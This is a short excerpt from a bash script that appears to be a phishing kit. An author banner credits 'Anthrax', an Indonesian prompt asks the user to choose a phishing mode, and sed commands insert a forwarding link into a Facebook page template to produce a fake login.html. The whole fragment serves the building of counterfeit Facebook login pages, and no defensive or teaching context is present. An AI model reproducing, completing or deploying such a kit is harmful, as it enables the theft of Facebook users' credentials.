...
printf " \e[0;36mAuthor: Anthrax\e[0m"
...
sed 's+forwarding_link+'$link'+g' facebook.html > login.html
...
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Pilih Mode Phising : \e[0m' option_server
...
sed 's+forwarding_link+'$send_link'+g' facebook.html > login.html
